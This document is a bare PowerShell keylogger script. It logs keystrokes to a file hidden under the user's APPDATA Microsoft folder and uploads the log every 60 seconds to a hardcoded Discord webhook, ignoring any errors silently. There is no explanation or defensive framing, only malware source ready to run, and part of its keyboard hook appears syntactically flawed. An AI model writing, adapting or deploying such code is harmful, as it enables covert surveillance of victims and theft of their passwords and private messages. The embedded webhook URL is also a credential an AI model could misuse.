# Config
$logFile = "$env:APPDATA\Microsoft\keylog.txt"
$webhookUrl = "https://discord.com/api/webhooks/1400154362399031406/DGLbSSN0EwdtdwbfECMX3S7WveKMCmsxGyXGfDFEzQFjiOl9dzlNoebvkt_yMi4pxSQs"
# CONFIG



# SETUP
Add-Type -AssemblyName System.Windows.Forms
$global:pressedKeys = ""

# SEND TO DISCORD FUNCTION
function Send-ToDiscord {
    if (Test-Path $logFile) {
        $content = Get-Content $logFile -Raw
        if ($content.Length -gt 0) {
            $payload = @{
                content = "**Keylog update**`n```\n$content\n```"
            } | ConvertTo-Json -Compress

            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                Clear-Content $logFile
            } catch {
                # Silent fail
            }
        }
    }
}

# TIMER TO SEND EVERY 60 SECONDS
$timer = New-Object Timers.Timer
$timer.Interval = 60000
$timer.AutoReset = $true
$timer.Enabled = $true
Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action { Send-ToDiscord }

# KEYLOGGER FILTER
[System.Windows.Forms.Application]::AddMessageFilter([System.Windows.Forms.IMessageFilter]{
    PreFilterMessage = {
        $msg = $_.Msg
        $wParam = $_.WParam.ToInt32()
        if ($msg -eq 0x100) {
            $key = [System.Windows.Forms.Keys]$wParam
            Add-Content -Path $logFile -Value "$key "
        }
        return $false
    }
})

# RUN
[System.Windows.Forms.Application]::Run()
# 
